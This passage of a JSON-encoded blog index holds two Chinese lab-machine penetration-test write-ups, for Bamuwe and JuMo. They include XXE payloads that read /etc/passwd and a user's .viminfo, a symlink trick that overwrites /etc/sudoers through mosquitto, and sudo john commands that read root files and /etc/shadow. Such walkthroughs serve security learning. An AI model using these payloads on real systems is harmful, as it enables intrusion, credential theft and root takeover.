Preparation](https://7r1umphk.github.io/image/20250430202715434.png)\n\n\u6211\u6ce8\u610f\u5230\u63d0\u4ea4\u8868\u5355\u540e\uff0c\u8f93\u5165\u7684 Email \u5730\u5740\u4f1a\u88ab\u56de\u663e\u5230\u54cd\u5e94\u9875\u9762\u4e2d\u3002\u8fd9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u65b9\u4fbf\u7684\u4f4d\u7f6e\u6765\u6ce8\u5165\u5e76\u663e\u793a\u5916\u90e8\u5b9e\u4f53\u7684\u5185\u5bb9\u3002\n\n**\u6784\u9020 HTTP POST \u8bf7\u6c42 (\u4f7f\u7528 Burp Repeater):**\n\n```http\nPOST / HTTP/1.1\nHost: 192.168.205.197\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 231\nOrigin: http://192.168.205.197\nDNT: 1\nSec-GPC: 1\nConnection: keep-alive\nReferer: http://192.168.205.197/\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n      <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>&xxe;</email>\n          <password>secret123</password>\n        </user>\n```\n\n* **\u5206\u6790\u54cd\u5e94:**\n\n  \u670d\u52a1\u5668\u8fd4\u56de\u7684\u54cd\u5e94\u9875\u9762\u4e2d\uff0c\u539f\u672c\u663e\u793a Email \u7684\u5730\u65b9\uff0c\u73b0\u5728\u663e\u793a\u4e86 `/etc/passwd` \u6587\u4ef6\u7684\u5185\u5bb9\u3002\n\n  ![XXE Result - /etc/passwd Content](https://7r1umphk.github.io/image/20250430203121961.png)\n\n  \u8fd9\u6210\u529f\u786e\u8ba4\u4e86 XXE \u6f0f\u6d1e\u7684\u5b58\u5728\u3002\u4ece `/etc/passwd` \u7684\u5185\u5bb9\u4e2d\uff0c\u6211\u6ce8\u610f\u5230\u4e86\u4e00\u4e2a\u540d\u4e3a `welcome` \u7684\u666e\u901a\u7528\u6237 (`uid=1000`)\u3002\n\n### 3.2. \u6f0f\u6d1e\u5229\u7528 (Exploitation - Credential Discovery)\n\n\u786e\u8ba4\u6f0f\u6d1e\u540e\uff0c\u76ee\u6807\u662f\u5229\u7528\u5b83\u6765\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6700\u597d\u662f\u7528\u6237\u51ed\u636e\u3002\u8003\u8651\u5230 `welcome` \u7528\u6237\u7684\u5b58\u5728\uff0c\u6211\u5c1d\u8bd5\u8bfb\u53d6\u5176\u5bb6\u76ee\u5f55\u4e0b\u7684\u5e38\u89c1\u654f\u611f\u6587\u4ef6\u3002\u5728\u5c1d\u8bd5\u4e86 `.bash_history`\u3001`.ssh/id_rsa` \u7b49\u6587\u4ef6\u65e0\u679c\u540e\uff0c\u6211\u51b3\u5b9a\u5c1d\u8bd5\u8bfb\u53d6 `.viminfo` \u6587\u4ef6\u3002Vim \u7f16\u8f91\u5668\u7684\u5386\u53f2\u8bb0\u5f55\u6587\u4ef6\u6709\u65f6\u4f1a\u610f\u5916\u5730\u5305\u542b\u5bc6\u7801\u6216\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002\n\n* **\u6784\u9020\u8bfb\u53d6 `.viminfo` \u7684 Payload:**\n\n  ```http\n  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///home/welcome/.viminfo'>]>\n  <user>\n      <name>John Doe</name>\n      <tel>123-4567890</tel>\n      <email>&xxe;</email>\n      <password>secret123</password>\n  </user>\n  ```\n\n* **\u53d1\u73b0\u51ed\u636e:**\n  \u53d1\u9001\u8bf7\u6c42\u540e\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u54cd\u5e94\u4e2d\u5305\u542b\u4e86 `/home/welcome/.viminfo` \u6587\u4ef6\u7684\u5185\u5bb9\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u4e4b\u524d\u7684\u7528\u6237\u8bfb\u53d6\u4e86`pass.txt`\n\n  ![XXE Result - Credentials in .viminfo](https://7r1umphk.github.io/image/20250430203435219.png)\n\n  \u6211\u4eec\u901a\u8fc7xxe\u83b7\u53d6pass.txt\u6587\u4ef6\uff0c\u53ef\u4ee5\u5f97\u5230\n\n  ```html\n  <div class='result'>Registration Status: Email \u3010welcome:bd7787d41a6b28e9976873cf6a8445fe\n  \u3011 submitted!</div>\n  ```\n\n  \u6210\u529f\u63d0\u53d6\u5230\u51ed\u636e\uff1a`welcome:bd7787d41a6b28e9976873cf6a8445fe`\n\n### 3.3. \u767b\u5f55\u7cfb\u7edf (Gaining Access)\n\n\u83b7\u5f97\u4e86 `welcome` \u7528\u6237\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6211\u7acb\u5373\u5c1d\u8bd5\u901a\u8fc7 SSH \u767b\u5f55\u76ee\u6807\u7cfb\u7edf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh welcome@192.168.205.197\nThe authenticity of host '192.168.205.197 (192.168.205.197)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:5: [hashed name]\n    ~/.ssh/known_hosts:7: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.197' (ED25519) to the list of known hosts.\nwelcome@192.168.205.197's password: \nLinux Bamuwe 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Apr 11 22:27:59 2025 from 192.168.3.94\nwelcome@Bamuwe:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u6210\u529f\u4ee5 `welcome` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u76ee\u6807\u7cfb\u7edf\u3002\n\n## 4. \u6743\u9650\u63d0\u5347 (welcome -> root - Sudo Misconfiguration & MQTT Abuse)\n\n### 4.1. \u4ee5 welcome \u8eab\u4efd\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 (Enumeration as welcome)\n\n\u767b\u5f55\u540e\uff0c\u9996\u8981\u4efb\u52a1\u662f\u5bfb\u627e\u6743\u9650\u63d0\u5347\u7684\u9014\u5f84\u3002\u6211\u9996\u5148\u68c0\u67e5\u4e86 `welcome` \u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nwelcome@Bamuwe:~$ sudo -l\nMatching Defaults entries for welcome on Bamuwe:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Bamuwe:\n    (ALL) NOPASSWD: /opt/sub.sh\n```\n\n\u8fd9\u662f\u4e00\u4e2a\u91cd\u5927\u7684\u53d1\u73b0\uff01`welcome` \u7528\u6237\u53ef\u4ee5 **\u65e0\u9700\u5bc6\u7801** (`NOPASSWD`) \u4ee5 **root** (`ALL`) \u6743\u9650\u6267\u884c `/opt/sub.sh` \u811a\u672c\u3002\u63a5\u4e0b\u6765\uff0c\u9700\u8981\u68c0\u67e5\u8fd9\u4e2a\u811a\u672c\u505a\u4e86\u4ec0\u4e48\u3002\n\n```bash\nwelcome@Bamuwe:~$ ls -al /opt/\ntotal 12\ndrwxr-xr-x  2 root root 4096 Apr 28 10:50 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\n-rwxr-xr-x  1 root root   52 Apr 28 10:50 sub.sh\nwelcome@Bamuwe:~$ cat /opt/sub.sh\n#!/bin/bash\n/usr/bin/mosquitto_sub '$@' > /home/welcome/sub.log\n```\n\n\u811a\u672c\u5185\u5bb9\u5f88\u7b80\u5355\uff1a\u5b83\u6267\u884c `mosquitto_sub`\uff08\u4e00\u4e2a MQTT \u8ba2\u9605\u5ba2\u6237\u7aef\uff09\uff0c\u5e76\u5c06\u6240\u6709\u547d\u4ee4\u884c\u53c2\u6570 (`'$@'`) \u4f20\u9012\u7ed9\u8be5\u547d\u4ee4\u3002\u5173\u952e\u5728\u4e8e\uff0c\u811a\u672c\u7684\u6807\u51c6\u8f93\u51fa\u88ab\u91cd\u5b9a\u5411\u5230\u4e86 `/home/welcome/sub.log` \u6587\u4ef6\u3002\u7531\u4e8e\u811a\u672c\u662f\u901a\u8fc7 `sudo` \u4ee5 root \u8eab\u4efd\u8fd0\u884c\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u811a\u672c\u4ee5 root \u6743\u9650 **\u5199\u5165** `/home/welcome/sub.log` \u6587\u4ef6\u3002\n\n### 4.2. \u5229\u7528\u7b56\u7565 (Exploitation Strategy)\n\n1. \u8fd9\u4e2a `sudo` \u89c4\u5219\u548c\u811a\u672c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6e05\u6670\u7684\u63d0\u6743\u8def\u5f84\uff1a\u5229\u7528 root \u6743\u9650\u5199\u5165 `/home/welcome/sub.log` \u7684\u80fd\u529b\uff0c\u7ed3\u5408\u7b26\u53f7\u94fe\u63a5 (Symbolic Link) \u6765\u8986\u76d6\u7cfb\u7edf\u4e0a\u7684\u4efb\u610f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u76ee\u6807\u662f\u8986\u76d6 `/etc/sudoers` \u6587\u4ef6\uff0c\u6dfb\u52a0\u4e00\u6761\u5141\u8bb8 `welcome` \u7528\u6237\u65e0\u5bc6\u7801\u6267\u884c\u6240\u6709\u547d\u4ee4\u7684\u89c4\u5219\u3002\n\n   \u5177\u4f53\u8ba1\u5212\u5982\u4e0b\uff1a\n\n   1.  \u5728 `/home/welcome/` \u76ee\u5f55\u4e0b\uff0c\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `sub.log` \u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u8ba9\u5b83\u6307\u5411 `/etc/sudoers`\u3002\n   2.  \u5728\u4e00\u4e2a SSH \u7ec8\u7aef\u4e2d\uff0c\u4ee5 `welcome` \u7528\u6237\u8eab\u4efd\u6267\u884c `sudo /opt/sub.sh -t 'exp'` (\u9009\u62e9\u4e00\u4e2a MQTT \u4e3b\u9898\uff0c\u4f8b\u5982 'exp')\u3002\u8fd9\u5c06\u4ee5 root \u6743\u9650\u542f\u52a8 `mosquitto_sub` \u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u76d1\u542c 'exp' \u4e3b\u9898\uff0c\u5e76\u5c06\u6536\u5230\u7684\u4efb\u4f55\u6d88\u606f\u5199\u5165 `/home/welcome/sub.log`\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7\u7b26\u53f7\u94fe\u63a5\u5199\u5165 `/etc/sudoers`\u3002\n   3.  \u6253\u5f00\u7b2c\u4e8c\u4e2a SSH \u7ec8\u7aef\uff0c\u540c\u6837\u4ee5 `welcome` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u3002\u4f7f\u7528 `mosquitto_pub` \u547d\u4ee4\u5411 'exp' \u4e3b\u9898\u53d1\u5e03\u4e00\u6761\u65b0\u7684 `sudoers` \u89c4\u5219\uff0c\u4f8b\u5982 `welcome ALL=(ALL) NOPASSWD:ALL`\u3002\n   4.  \u8fd9\u6761\u89c4\u5219\u4f1a\u88ab\u7b2c\u4e00\u4e2a\u7ec8\u7aef\u4e2d\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u7684 `mosquitto_sub` \u63a5\u6536\uff0c\u5e76\u8986\u76d6 `/etc/sudoers` \u6587\u4ef6\u3002\n   5.  \u5b8c\u6210\u4ee5\u4e0a\u6b65\u9aa4\u540e\uff0c`welcome` \u7528\u6237\u5e94\u8be5\u5c31\u83b7\u5f97\u4e86\u65e0\u5bc6\u7801\u6267\u884c\u4efb\u4f55\u547d\u4ee4\u7684 `sudo` \u6743\u9650\u3002\n\n### 4.3. \u6267\u884c\u5229\u7528 (Executing the Exploit)\n\n\u6309\u7167\u8ba1\u5212\u6267\u884c\uff1a\n\n1. **\u521b\u5efa\u7b26\u53f7\u94fe\u63a5:**\n   (\u9996\u5148\u786e\u4fdd `/home/welcome/sub.log` \u4e0d\u5b58\u5728\uff0c\u6216\u8005\u5220\u9664\u5b83)\n\n   ```bash\n   welcome@Bamuwe:~$ ln -sf /etc/sudoers /home/welcome/sub.log \n   ```\n\n2. **\u542f\u52a8 MQTT \u8ba2\u9605\u8005 (\u76d1\u542c\u5e76\u51c6\u5907\u5199\u5165 sudoers):**\n   \u5728\u7b2c\u4e00\u4e2a SSH \u7ec8\u7aef\u7a97\u53e3\u4e2d\u6267\u884c\uff1a\n\n   ```bash\n   welcome@Bamuwe:~$ sudo /opt/sub.sh -t 'exp' \n   ```\n\n   \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u6302\u8d77\uff0c\u7b49\u5f85\u6d88\u606f\u3002\u6b64\u65f6\uff0c\u4e00\u4e2a\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684 `mosquitto_sub` \u8fdb\u7a0b\u6b63\u5728\u76d1\u542c 'exp' \u4e3b\u9898\uff0c\u51c6\u5907\u5c06\u6536\u5230\u7684\u6d88\u606f\u5199\u5165 `/etc/sudoers`\u3002\n\n3. **\u53d1\u5e03\u6076\u610f\u7684 Sudoers \u89c4\u5219:**\n   \u6253\u5f00\u7b2c\u4e8c\u4e2a SSH \u7ec8\u7aef\u7a97\u53e3\uff0c\u4ee5 `welcome` \u7528\u6237\u767b\u5f55\uff0c\u5e76\u6267\u884c\uff1a\n\n   ```bash\n   welcome@Bamuwe:~$ echo 'welcome ALL=(ALL) NOPASSWD:ALL' | mosquitto_pub -t 'exp' -l\n   ```\n\n   \u8fd9\u6761\u547d\u4ee4\u4f7f\u7528 `mosquitto_pub` \u5c06\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u7684 `sudoers` \u89c4\u5219\u4f5c\u4e3a\u5355\u884c\u6d88\u606f (`-l` \u9009\u9879) \u53d1\u5e03\u5230 'exp' \u4e3b\u9898\u3002\n\n\n### 4.4. \u83b7\u53d6 Root \u6743\u9650 (Gaining Root Access)\n\n\u73b0\u5728\uff0c\u6076\u610f\u7684 `sudoers` \u89c4\u5219\u5e94\u8be5\u5df2\u7ecf\u88ab\u5199\u5165 `/etc/sudoers` \u6587\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u9a8c\u8bc1 `welcome` \u7528\u6237\u7684\u65b0\u6743\u9650\u3002\n\n1. **\u9a8c\u8bc1\u65b0\u6743\u9650:**\n   \u56de\u5230**\u7b2c\u4e8c\u4e2a**\u7ec8\u7aef\uff0c\u6267\u884c `sudo -l`\uff1a\n\n   ```bash\n   welcome@Bamuwe:~$ sudo -l\n   Matching Defaults entries for welcome on Bamuwe:\n       env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n   \n   User welcome may run the following commands on Bamuwe:\n       (ALL) NOPASSWD: ALL   # <--- \u6210\u529f\uff01\u6743\u9650\u5df2\u63d0\u5347\n   ```\n\n   \u8f93\u51fa\u786e\u8ba4 `welcome` \u7528\u6237\u73b0\u5728\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c\u6240\u6709\u547d\u4ee4\u3002\n\n2. **\u83b7\u53d6 Root Shell:**\n   \u6700\u540e\u4e00\u6b65\uff0c\u5207\u6362\u5230 root \u7528\u6237\uff1a\n\n   ```bash\n   welcome@Bamuwe:~$ sudo su -\n   root@Bamuwe:~# id\n   uid=0(root) gid=0(root) groups=0(root)\n   root@Bamuwe:~# whoami\n   root\n   ```\n\n\u6210\u529f\u83b7\u53d6\u4e86\u76ee\u6807\u7cfb\u7edf\u7684 root \u6743\u9650\u3002sentence", "top": 0, "createdAt": 1751016488, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P11": {"htmlDir": "docs/post/shen-tou-ce-shi-bao-gao- - JuMo (-ce-shi-ba-ji-).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - JuMo (\u6d4b\u8bd5\u9776\u673a)", "postUrl": "post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/11", "commentNum": 0, "wordCount": 4432, "description": "# 1. \u7b80\u4ecb\n\n- \u9776\u673a\u540d\u79f0: JuMo (\u672a\u53d1\u5e03\uff0c\u5185\u90e8\u6d4b\u8bd5\u9776\u673a\uff0c\u53ef\u80fd\u540e\u7eed\u53d1\u5e03\u4e8e HackMyVm)\n- \u96be\u5ea6: \u4f4e (Low)\n- \u76ee\u6807 IP: 192.168.205.182 (\u901a\u8fc7 arp-scan \u53d1\u73b0)\n- \u653b\u51fb\u673a IP: 192.168.205.128\n- \u76ee\u6807: \u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684 root \u6743\u9650\u5e76\u627e\u5230 flag\u3002\n\n# 2. \u4fe1\u606f\u6536\u96c6 (Enumeration)\n\n## 2.1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528 arp-scan \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n# ... (\u5176\u4ed6\u8f93\u51fa) ...\n192.168.205.182 08:00:27:ff:bf:ce       PCS Systemtechnik GmbH #<-- \u76ee\u6807\u4e3b\u673a\n# ... (\u5176\u4ed6\u8f93\u51fa) ...\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded\n```\n\n\u786e\u8ba4\u76ee\u6807 IP \u4e3a 192.168.205.182\u3002\n\n## 2.2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 nmap \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -p- 192.168.205.182\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 08:46 CST\nNmap scan report for 192.168.205.182\nHost is up (0.00022s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh     #<-- SSH \u670d\u52a1\u5f00\u653e\n80/tcp open  http    #<-- HTTP \u670d\u52a1\u5f00\u653e\nMAC Address: 08:00:27:FF:BF:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.47 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n# 3. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650 (Initial Foothold)\n\n## 3.1. Web \u670d\u52a1\u63a2\u6d4b\n\n\u8bbf\u95ee\u76ee\u6807\u4e3b\u673a\u7684 80 \u7aef\u53e3\uff08 http://192.168.205.182 \uff09\u3002\n\n![image-20250411084817446](https://7r1umphk.github.io/image/20250411084824566.png)\n\n\u8fd9\u4e2a\u63d0\u793a\u6211\u4eec\u5728 hackmyvm \u5e73\u53f0\u4e0a\u67e5\u627e\u4e00\u4e2a\u540d\u4e3a check \u7684\u7528\u6237\u3002\n\n## 3.2. \u4fe1\u606f\u6316\u6398\n\n\u5728 HackMyVm \u7f51\u7ad9\u4e0a\u641c\u7d22\u7528\u6237 check\u3002\n\n![image-20250411085044849](https://7r1umphk.github.io/image/20250411085044939.png)\n\n\u627e\u5230\u4e86\u8be5\u7528\u6237\u7684\u4e2a\u4eba\u8d44\u6599\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u5916\u90e8\u94fe\u63a5\u3002\u8bbf\u95ee\u8be5\u94fe\u63a5\uff1a\n\n![image-20250411085314126](https://7r1umphk.github.io/image/20250411085314150.png)\n\n\u9875\u9762\u4e0a\u6709\u4e00\u4e32 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u4e32 d2VsY29tZTpqdW1v\u3002\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'd2VsY29tZTpqdW1v' | base64 -d\nwelcome:jumo\n```\n\n\u89e3\u7801\u540e\u5f97\u5230 welcome:jumo\uff0c\u8fd9\u5f88\u53ef\u80fd\u662f\u4e00\u5bf9 SSH \u767b\u5f55\u51ed\u636e\uff08\u7528\u6237\u540d:\u5bc6\u7801\uff09\u3002\n\n## 3.3. SSH \u767b\u5f55\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u636e\u5c1d\u8bd5 SSH \u767b\u5f55\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh welcome@192.168.205.182\n# ...(SSH \u8fde\u63a5\u786e\u8ba4)...\nPassword: # \u8f93\u5165\u5bc6\u7801 jumo\nLinux JuMo 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64\n# ... (\u6b22\u8fce\u4fe1\u606f) ...\nwelcome@JuMo:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u6210\u529f\u4ee5 welcome \u7528\u6237\u8eab\u4efd\u767b\u5f55\u7cfb\u7edf\u3002\n\n# 4. \u6743\u9650\u63d0\u5347 (Privilege Escalation)\n\n## 4.1. Sudo \u6743\u9650\u68c0\u67e5\n\n\u68c0\u67e5 welcome \u7528\u6237\u62e5\u6709\u7684 sudo \u6743\u9650\uff1a\n\n```bash\nwelcome@JuMo:~$ sudo -l\nMatching Defaults entries for welcome on JuMo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on JuMo:\n    (ALL : ALL) NOPASSWD: /usr/sbin/john   #<-- \u53ef\u4ee5\u514d\u5bc6\u4ee5 root \u6743\u9650\u6267\u884c john\n```\n\n\u8f93\u51fa\u663e\u793a welcome \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801 (NOPASSWD) \u4ee5\u4efb\u4f55\u7528\u6237 (ALL:ALL) \u7684\u8eab\u4efd\u6267\u884c /usr/sbin/john \u547d\u4ee4\u3002john (John the Ripper) \u662f\u4e00\u4e2a\u5bc6\u7801\u7834\u89e3\u5de5\u5177\u3002\n\n## 4.2. \u5229\u7528 Sudo \u6743\u9650\n\n\u7531\u4e8e\u53ef\u4ee5\u4ee5 root \u8eab\u4efd\u6267\u884c john\uff0c\u5e76\u4e14 /root \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u901a\u5e38\u53ea\u6709 root \u7528\u6237\u53ef\u8bfb\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528 john \u8bfb\u53d6 /root \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002\n\n### \u65b9\u6cd5\u4e00\uff1a\u76f4\u63a5\u8bfb\u53d6\u53ef\u80fd\u7684 Flag \u6587\u4ef6 (\u6211\u7684\u65b9\u6cd5)\n\n\u5df2\u77e5 /root/root.txt \u5305\u542b\u4e86 flag\u3002\u867d\u7136 john \u7684 --wordlist \u9009\u9879\u901a\u5e38\u7528\u4e8e\u6307\u5b9a\u5bc6\u7801\u5b57\u5178\uff0c\u4f46\u914d\u5408 --stdout \u9009\u9879\uff0cjohn \u4f1a\u5c06 wordlist \u7684\u5185\u5bb9\uff08\u6216\u751f\u6210\u7684\u5019\u9009\u5bc6\u7801\uff09\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u3002\u5229\u7528 sudo \u6743\u9650\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u8bfb\u53d6 root \u6743\u9650\u624d\u80fd\u8bbf\u95ee\u7684\u6587\u4ef6\u5185\u5bb9\u3002\n\n```bash\nwelcome@JuMo:~$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout\nPress 'q' or Ctrl-C to abort, almost any other key for status\nflag{521ca933d6e159a50c2c04e7daa930f6}  #<-- \u8bfb\u53d6\u5e76\u8f93\u51fa\u4e86 /root/root.txt \u7684\u5185\u5bb9\n1p 0:00:00:00 100% 100.0p/s flag{521ca933d6e159a50c2c04e7daa930f6}\n```\n\n\u6b64\u547d\u4ee4\u6210\u529f\u8bfb\u53d6\u4e86 /root/root.txt \u6587\u4ef6\uff0c\u5185\u5bb9\u5373\u4e3a flag\u3002\n\n### \u65b9\u6cd5\u4e8c\uff1a\u8bfb\u53d6\u53ef\u80fd\u7684 Flag \u6587\u4ef6 (ta0\u795e\u7684\u65b9\u6cd5)\n\n```bash\nwelcome@JuMo:~$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt\nLoaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} \nSession completed\n```\n\n## 4.3. \u83b7\u53d6 Root \u6743\u9650\n\n\u6839\u636e\u7fa4\u4e3b\u63d0\u793a\u6211\u4eec\u53ef\u77e5root\u5bc6\u7801\u4e3aroot flag\n\n```bash\nwelcome@JuMo:~$ su -\nPassword: # \u8f93\u5165 521ca933d6e159a50c2c04e7daa930f6\nroot@JuMo:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@JuMo:~# cat /root/root.txt\nflag{521ca933d6e159a50c2c04e7daa930f6}\n```\n\n\u6210\u529f\u83b7\u53d6 root \u6743\u9650\u3002\u6700\u7ec8\u7684 flag \u5b58\u50a8\u5728 /root/root.txt \u4e2d\u3002\n\n# 5. \u603b\u7ed3\n\n\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u5b8c\u6210\uff1a\n\n1. \u4fe1\u606f\u6536\u96c6: \u4f7f\u7528 arp-scan \u548c nmap \u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u53ca\u5176\u5f00\u653e\u7684 SSH \u548c HTTP \u670d\u52a1\u3002\n2. \u521d\u59cb\u8bbf\u95ee: \u5206\u6790\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u6307\u5411 HackMyVm \u7528\u6237 check \u7684\u7ebf\u7d22\uff0c\u8fdb\u800c\u627e\u5230\u5176\u5916\u90e8\u94fe\u63a5\u4e2d\u7684 Base64 \u7f16\u7801\u51ed\u636e\uff0c\u6210\u529f\u901a\u8fc7 SSH \u767b\u5f55 welcome \u7528\u6237\u3002\n3. \u6743\u9650\u63d0\u5347: \u53d1\u73b0 welcome \u7528\u6237\u53ef\u901a\u8fc7 sudo \u514d\u5bc6\u6267\u884c john \u547d\u4ee4\u3002\u5229\u7528\u6b64\u6743\u9650\uff0c\u901a\u8fc7 john --wordlist=/root/root.txt --stdout \u76f4\u63a5\u8bfb\u53d6\u4e86 /root/root.txt \u4e2d\u7684 flag\uff0c\u6216\u8005\u901a\u8fc7 john /etc/shadow --wordlist=/root/root.txt \u7834\u89e3\u51fa root \u5bc6\u7801\uff08\u5bc6\u7801\u6070\u597d\u662f flag\uff09\uff0c\u6700\u7ec8\u4f7f\u7528 su \u547d\u4ee4\u5207\u6362\u5230 root \u7528\u6237\u3002\n\n\u9776\u673a\u8bbe\u8ba1\u5de7\u5999\uff0c\u5229\u7528\u4e86\u4fe1\u606f\u6cc4\u9732\u548c sudo \u914d\u7f6e\u4e0d\u5f53\u7684\u6f0f\u6d1e\uff0c\u96be\u5ea6\u7b26\u5408 Low \u7ea7\u522b\u3002sentence", "top": 0, "createdAt": 1751016491, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P12": {"htmlDir": 